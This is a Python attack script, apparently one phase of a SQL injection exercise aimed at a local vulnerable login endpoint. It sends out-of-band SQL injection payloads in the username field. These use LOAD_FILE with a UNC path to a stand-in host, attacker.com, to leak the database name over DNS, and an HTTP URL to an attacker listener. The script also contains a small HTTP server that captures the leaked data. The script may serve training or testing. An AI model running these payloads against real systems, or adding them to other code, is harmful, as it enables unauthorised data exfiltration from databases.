#!/usr/bin/env python3
"""Phase 6: Out-of-Band SQL Injection - DNS/HTTP Exfiltration"""

import requests
import argparse
import socket
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler


class DNSHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        print(f"\n  📡 Received exfiltrated data: {self.path}")
        self.send_response(200)
        self.end_headers()


class Phase6OutOfBand:
    def __init__(self, target="http://localhost:5001", attacker_host="localhost", attacker_port=8080):
        self.target = target
        self.attacker_host = attacker_host
        self.attacker_port = attacker_port

    def start_listener(self):
        server = HTTPServer(
            (self.attacker_host, self.attacker_port), DNSHandler)
        thread = threading.Thread(target=server.serve_forever)
        thread.daemon = True
        thread.start()
        print(f"  📡 Listening on {self.attacker_host}:{self.attacker_port}")

    def test_oob(self, name, payload):
        try:
            data = {"username": payload, "password": "test"}
            response = requests.post(
                f"{self.target}/api/vulnerable/login", json=data, timeout=5)
            print(f"  ✅ {name} - Payload sent")
            return True
        except Exception as e:
            print(f"  ❌ {name} - Error: {str(e)}")
            return False

    def run(self):
        print("\n" + "="*70)
        print("PHASE 6: OUT-OF-BAND SQL INJECTION")
        print("="*70)
        print(f"Target: {self.target}\n")

        print("⚠️ This phase requires an external server to capture data")
        print("Starting local listener...\n")
        # self.start_listener()

        tests = [
            ("DNS Exfiltration Test",
             f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\', database(), '.test.attacker.com\\\\test')) --"),
            ("HTTP Exfiltration Test",
             f"' UNION SELECT LOAD_FILE(CONCAT('http://{self.attacker_host}:{self.attacker_port}/', database())) --"),
        ]

        for name, payload in tests:
            self.test_oob(name, payload)
            print()

        print("="*70)
        print("✅ Phase 6 Complete")
        print("="*70)


if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://localhost:5001")
    args = parser.parse_args()
    phase = Phase6OutOfBand(target=args.target)
    phase.run()
